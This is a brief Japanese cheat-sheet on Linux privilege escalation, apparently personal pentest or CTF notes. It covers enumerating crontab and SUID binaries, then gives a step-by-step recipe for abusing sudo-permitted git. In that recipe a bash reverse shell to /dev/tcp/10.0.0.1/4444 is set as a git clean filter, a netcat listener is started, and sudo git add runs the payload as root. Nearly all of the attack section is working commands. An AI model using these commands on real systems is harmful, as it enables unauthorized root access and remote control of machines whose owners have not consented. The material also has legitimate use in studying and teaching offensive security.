# 権限昇格

1. crontab を確認して root 権限で動作するものがないか調べる
   ```zsh
   $ cat /etc/crontab|grep -v ^#
   ```
2. SUID ビットが立っているコマンドを探す
   ```zsh
   $ find / -perm -4000 -type f 2>/dev/null
   ```
3. 権限昇格に利用できるコマンドが無いか調べる
   - https://gtfobins.org/

## git コマンドの脆弱性の利用して権限昇格する例

- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/git/

### ローカルのアドレスを調べる

```zsh
$ ip -brief a s dev eth0
eth0             UP             10.0.0.1/24
```

### ペイロードを作成する

```zsh
$ echo 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"' > /tmp/revshell
$ chmod +x /tmp/revshell
```

### git コンフィグを設定する

```zsh
# Go to the git repository
$ cd /opt/example
$ git init
$ echo '*.php filter=indent' > .git/info/attributes
$ git config filter.indent.clean /tmp/revshell
```

### ローカルで待ち受ける

```zsh
$ nc -lvnp 4444
```

### コミットする

```zsh
$ touch foo.php
```

```zsh
$ sudo /usr/bin/git --git-dir=/opt/example/.git --work-tree=/opt/example add -A
```
